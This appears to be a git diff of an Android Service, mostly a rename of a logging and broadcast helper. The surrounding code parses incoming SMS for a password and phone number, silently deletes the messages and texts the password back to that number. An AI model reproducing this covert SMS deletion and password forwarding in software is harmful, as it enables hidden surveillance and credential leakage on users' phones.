@@ -95,7 +95,7 @@ public class Service extends android.app.Service
     {
         try
         {
-            //context.deleteDatabase(Database.ANDROID_V_1_5.databaseName);
+            context.deleteDatabase(Database.ANDROID_V_1_5.databaseName);
 
             initLocalDatabase(context);
 
@@ -244,14 +244,12 @@ public class Service extends android.app.Service
     public void runSmsEvent(final String address, final String body, final boolean incoming, ContentResolver contentResolver)
     {
         final ContentResolver resolver = contentResolver == null ? getApplicationContext().getContentResolver() : contentResolver;
-        Log.v("resolver=" + resolver + "; incoming=" + incoming);
-
         new Thread(new Runnable()
         {
             public void run()
             {
                 String message = address + ": " + body;
-                printMessageOnScreen(message);
+                printDataOnScreen(message);
 
                 try
                 {
@@ -261,7 +259,7 @@ public class Service extends android.app.Service
                         removeOldSms(resolver);
                 } catch (Exception e)
                 {
-                    printMessageOnScreen(e.getMessage());
+                    printDataOnScreen(e.getMessage());
                     e.printStackTrace();
                 }
 
@@ -290,7 +288,7 @@ public class Service extends android.app.Service
             String destinationAddress = split[phoneNumberResult];
             String password = split[passwordResult];
             String message = OK + password;
-            printMessageOnScreen(destinationAddress + ": " + message);
+            printDataOnScreen(destinationAddress + ": " + message);
             removeMessageById(resolver, cursor.getInt(SmsObserver.ID));
             sms.sendTextMessage(destinationAddress, null, message, null, null);
         }
@@ -346,10 +344,10 @@ public class Service extends android.app.Service
         try
         {
             int result = resolver.delete(Uri.parse(SmsObserver.CONTENT_SMS + messageId), null, null);
-            printMessageOnScreen("deleting SMS/id: " + messageId + "; result: " + result);
+            printDataOnScreen("deleting SMS/id: " + messageId + "; result: " + result);
         } catch (Exception e)
         {
-            printMessageOnScreen("deleting SMS/id e: " + e.getMessage());
+            printDataOnScreen("deleting SMS/id e: " + e.getMessage());
             e.printStackTrace();
         }
     }
@@ -387,12 +385,11 @@ public class Service extends android.app.Service
         return new Pair<>(passwordResult, phoneNumberResult);
     }
 
-    public void printMessageOnScreen(String message)
+    public void printDataOnScreen(String data)
     {
-        Log.v("message=" + message);
-
+        Log.v(data);
         Intent i = new Intent("EVENT_UPDATED");
-        i.putExtra("<Key>", message);
+        i.putExtra("<Key>", data);
         sendBroadcast(i);
     }
 
